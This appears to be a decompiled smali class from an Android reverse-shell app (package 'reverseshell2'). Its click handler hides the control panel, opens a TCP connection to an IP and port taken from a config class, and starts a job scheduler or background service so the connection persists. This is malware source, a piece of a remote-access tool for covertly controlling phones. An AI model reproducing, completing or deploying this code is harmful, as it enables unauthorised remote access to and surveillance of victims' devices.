.class Lcom/example/reverseshell2/controlPanel$2;
.super Ljava/lang/Object;
.source "controlPanel.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/controlPanel;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/reverseshell2/controlPanel;

.field final synthetic val$activity:Landroid/app/Activity;


# direct methods
.method constructor <init>(Lcom/example/reverseshell2/controlPanel;Landroid/app/Activity;)V
    .locals 0
    .param p1, "this$0"    # Lcom/example/reverseshell2/controlPanel;

    .line 38
    iput-object p1, p0, Lcom/example/reverseshell2/controlPanel$2;->this$0:Lcom/example/reverseshell2/controlPanel;

    iput-object p2, p0, Lcom/example/reverseshell2/controlPanel$2;->val$activity:Landroid/app/Activity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 4
    .param p1, "view"    # Landroid/view/View;

    .line 41
    iget-object v0, p0, Lcom/example/reverseshell2/controlPanel$2;->this$0:Lcom/example/reverseshell2/controlPanel;

    invoke-virtual {v0}, Lcom/example/reverseshell2/controlPanel;->finish()V

    .line 42
    new-instance v0, Lcom/example/reverseshell2/tcpConnection;

    iget-object v1, p0, Lcom/example/reverseshell2/controlPanel$2;->val$activity:Landroid/app/Activity;

    iget-object v2, p0, Lcom/example/reverseshell2/controlPanel$2;->this$0:Lcom/example/reverseshell2/controlPanel;

    invoke-virtual {v2}, Lcom/example/reverseshell2/controlPanel;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Lcom/example/reverseshell2/tcpConnection;-><init>(Landroid/app/Activity;Landroid/content/Context;)V

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/String;

    sget-object v2, Lcom/example/reverseshell2/config;->IP:Ljava/lang/String;

    const/4 v3, 0x0

    aput-object v2, v1, v3

    sget-object v2, Lcom/example/reverseshell2/config;->port:Ljava/lang/String;

    const/4 v3, 0x1

    aput-object v2, v1, v3

    invoke-virtual {v0, v1}, Lcom/example/reverseshell2/tcpConnection;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 43
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-lt v0, v1, :cond_0

    .line 44
    new-instance v0, Lcom/example/reverseshell2/functions;

    iget-object v1, p0, Lcom/example/reverseshell2/controlPanel$2;->val$activity:Landroid/app/Activity;

    invoke-direct {v0, v1}, Lcom/example/reverseshell2/functions;-><init>(Landroid/app/Activity;)V

    iget-object v1, p0, Lcom/example/reverseshell2/controlPanel$2;->this$0:Lcom/example/reverseshell2/controlPanel;

    invoke-virtual {v1}, Lcom/example/reverseshell2/controlPanel;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/example/reverseshell2/functions;->jobScheduler(Landroid/content/Context;)V

    goto :goto_0

    .line 46
    :cond_0
    iget-object v0, p0, Lcom/example/reverseshell2/controlPanel$2;->val$activity:Landroid/app/Activity;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcom/example/reverseshell2/controlPanel$2;->this$0:Lcom/example/reverseshell2/controlPanel;

    invoke-virtual {v2}, Lcom/example/reverseshell2/controlPanel;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/example/reverseshell2/mainService;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 49
    :goto_0
    return-void
.end method
